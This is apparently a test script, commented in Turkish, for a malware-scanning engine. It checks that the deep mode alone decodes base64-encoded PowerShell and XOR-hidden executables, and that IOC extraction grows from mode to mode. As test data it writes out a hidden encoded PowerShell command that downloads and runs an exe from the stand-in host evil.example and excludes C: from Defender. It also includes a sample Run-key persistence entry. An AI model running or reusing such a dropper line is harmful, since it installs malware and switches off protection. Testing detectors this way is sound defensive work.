// Hizli/Normal/Derin modlarin GERCEKTEN farkli analiz yaptigini kanitlar: SAMPLES=<dizin> node tools/test/modes.mjs
import fs from 'node:fs'; import path from 'node:path'; import { loadEngine, scan, ids, allIds } from './engine.mjs'; import { zipStore } from './zipw.mjs';
const E = loadEngine(); const S = process.env.SAMPLES; let bad = 0; const ok = (c, m) => { console.log((c ? 'OK   ' : 'FAIL ') + m); if (!c) bad++; };
const enc = new TextEncoder(); const b64 = (s) => Buffer.from(s, 'utf16le').toString('base64');
const trio = async (name, data) => ({ q: await scan(E, name, data, 'quick'), n: await scan(E, name, data, 'normal'), d: await scan(E, name, data, 'deep') });
const has = (r, id) => allIds(r).has(id); const done = (r) => r.analyses.filter((a) => a.status === 'done').length;
// 1) Base64/PowerShell katman cozme: yalnizca Derin
const inner = "Invoke-WebRequest -Uri 'http://evil.example/p.exe' -OutFile $env:TEMP\\p.exe; Start-Process $env:TEMP\\p.exe; Add-MpPreference -ExclusionPath C:\\";
const ps = enc.encode('powershell -nop -w hidden -enc ' + b64(inner) + '\n'); let t = await trio('x.ps1', ps);
const dl = (r) => allIds(r).has('ps_download') || allIds(r).has('dl_exe_url') || allIds(r).has('defender_off') || allIds(r).has('deobf_layer');
ok(has(t.d, 'deobf_layer') && !has(t.q, 'deobf_layer') && !has(t.n, 'deobf_layer'), 'Base64 -enc katmanı: yalnızca Derin çözer (deobf_layer)'); ok(t.d.findings.length > t.n.findings.length || allIds(t.d).size > allIds(t.n).size, 'Derin, çözülen içerikten ek bulgu üretir (' + allIds(t.d).size + ' > ' + allIds(t.n).size + ')');
// 2) XOR'lu PE: yalnizca Derin
const pe = fs.readFileSync(S + '/pe_chk.exe'); const x = new Uint8Array(20000 + pe.length); for (let i = 0; i < pe.length; i++) x[10000 + i] = pe[i] ^ 0x5a; for (let i = 0; i < 10000; i++) x[i] = (i * 7) & 0xff; for (let i = 10000 + pe.length; i < x.length; i++) x[i] = (i * 13) & 0xff; t = await trio('payload.bin', x);
ok(has(t.d, 'xor_pe') && !has(t.n, 'xor_pe') && !has(t.q, 'xor_pe'), 'Tek baytlık XOR ile gizlenmiş PE: yalnızca Derin');
// 3) Jar icinde XOR'lu PE ve base64'lu girdi
const jar = zipStore([['META-INF/MANIFEST.MF', 'Manifest-Version: 1.0\n'], ['res/data.bin', x], ['res/note.txt', 'c2V0dGluZ3M=' + 'A'.repeat(0) + '\n' + b64(inner) + '\n']]); t = await trio('mod.jar', jar);
ok(has(t.d, 'xor_pe') && !has(t.n, 'xor_pe'), 'Jar içi XOR PE: yalnızca Derin');
// 4) IOC seviyeleri
const ioc = enc.encode('GET http://203.0.113.9/a.txt\ncontact: bad.actor@example.org\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd\n'); t = await trio('n.txt', ioc);
const iocCount = (r) => { const o = r.info && r.info.iocs; return o ? Object.values(o).reduce((a, v) => a + (Array.isArray(v) ? v.length : 0), 0) : 0; }; const iocKinds = (r) => Object.keys((r.info && r.info.iocs) || {}).filter((k) => (r.info.iocs[k] || []).length);
ok(iocCount(t.q) === 0 && iocCount(t.n) > 0 && iocKinds(t.d).length > iocKinds(t.n).length, 'IOC: hızlı yok; normal URL/IP; derin e-posta/kayıt defteri de (' + iocKinds(t.n).join(',') + ' → ' + iocKinds(t.d).join(',') + ')');
// 5) PE: imphash/Rich/rsrc yalnizca Derin; Authenticode yalnizca normal+
t = await trio('p.exe', pe); ok(!t.q.info.imphash && !t.n.info.imphash && !!t.d.info.imphash, 'imphash yalnızca Derin'); const sg = (r) => (r.analyses.find((a) => a.id === 'sig') || {}).status;
// 6) Her ornekte adim sayisi: hizli <= normal <= derin; bulgu kumesi: hizli ⊆ normal
let viol = 0, strict = 0, files = 0; const rec = (d) => { for (const f of fs.readdirSync(d, { withFileTypes: true })) { const p = path.join(d, f.name); if (f.isDirectory()) rec(p); else list.push(p); } }; const list = []; rec(S);
for (const f of list) { const u = new Uint8Array(fs.readFileSync(f)); const r = await trio(path.basename(f), u); files++; if (!(done(r.q) <= done(r.n) && done(r.n) <= done(r.d))) { viol++; console.log('  adım sırası ihlali: ' + f); } if (done(r.q) < done(r.d)) strict++; const miss = [...allIds(r.q)].filter((i) => !allIds(r.n).has(i)); if (miss.length) { viol++; console.log('  hızlı ⊄ normal: ' + path.basename(f) + ' ' + miss); } }
ok(viol === 0, files + ' örnekte: adım sayısı hızlı ≤ normal ≤ derin ve hızlının bulguları normalde de var'); ok(strict === files, 'her örnekte Derin, Hızlı’dan en az bir ek analiz adımı çalıştırıyor (' + strict + '/' + files + ')');
// 7) matris iddialari ile gercek davranis: deobf/xor/ioc
const M = E.methodMatrix(); const row = (id) => M.rows.find((r) => r.id === id).modes;
ok(row('deobf').deep.state === 'full' && has(t.d, 'x') === false, 'matris deobf=Derin ile test 1 tutarlı');
console.log(bad ? bad + ' TEST BAŞARISIZ' : 'tüm testler geçti'); process.exit(bad ? 1 : 0);
